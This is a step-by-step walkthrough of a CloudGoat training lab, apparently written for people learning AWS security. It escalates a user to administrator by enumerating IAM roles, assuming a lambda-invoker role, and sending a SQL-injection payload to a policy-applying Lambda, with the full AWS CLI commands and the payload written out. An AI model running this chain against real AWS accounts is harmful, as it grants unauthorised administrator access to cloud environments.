1. Get permissions for the 'bilbo' user.

    ```bash
    # This command will give you the ARN & full name of you user.
    aws --profile bilbo --region us-east-1 sts get-caller-identity
    # This command will list the policies attached to your user.
    aws --profile bilbo --region us-east-1 iam list-user-policies --user-name [your_user_name]
    # This command will list all of your permissions.
    aws --profile bilbo --region us-east-1 iam get-user-policy --user-name [your_user_name] --policy-name [your_policy_name]
    ```
2. List all roles, assume a role for privesc.

    ```bash
    # This command will list all the roles in your account, one of which should be assumable. 
    aws --profile bilbo --region us-east-1 iam list-roles
    # This command will get you credentials for the cloudgoat role that can invoke lambdas.
    aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]

    ```
3. List lambdas to identify the target lambda.

    ```bash
    # This command will show you two cloudgoat functions. One function is the target function that you need
    # to invoke in order to finish this scenario. The other function can apply a predefined set of
    # aws managed policies to users (in reality it can only modify the bilbo user).
    aws --profile assumed_role --region us-east-1 lambda list-functions
    ```
4. Look at the lambda source code. You should see the database structure in a comment, 
as well as the code that is handling input parameters. It's vulnerable to an injection, and 
we'll see what an exploit looks like in the next step.

    ```bash
    # This command will return a bunch of information about the lambda that can apply policies to bilbo.
    # part of this information is a link to a url that will download the deployment package, which
    # contains the source code for the function.
    aws --profile assumed_role --region us-east-1 lambda get-function --function-name [policy_applier_lambda_name]
    ```
5. Craft an injection payload to send through the CLI. This is the payload field that will be used to invoke the lambda.

    ```bash
    # This payload is being written to a file in preperation for the next step. 
    echo "{ \"policy_names\": [\"AmazonSNSReadOnlyAccess\", \"AdministratorAccess\' --\"], \"user_name\": \"[bilbo_user_name_here]\" }" >> payload.txt
    ```
6. Invoke the role applier lambda function, passing the name of the bilbo user and the base64 encoded injection payload. 

    ```bash
    # Passing an injection payload through the cli is a bit complicated. The single quote needed to perform SQL injection
    # causes an argument parsing error for the cli, so I base64 encoded it. That process adds newline characters, which cause
    # the same problem, so that is removed after the pipe. 
    aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --payload $(base64 payload.txt | tr -d '\n') output.txt
    ```
7. Now that Bilbo is an admin, use credentials for that user to invoke the target lambda. 

    ```bash
    # This command invokes the target lambda
    aws --profile bilbo --region us-east-1 lambda invoke --function-name cg-lambda_injection_privesc_cgid05fabeanxc-target_lambda output.txt
    # This reads the response from the lambda
    cat output.txt
    ```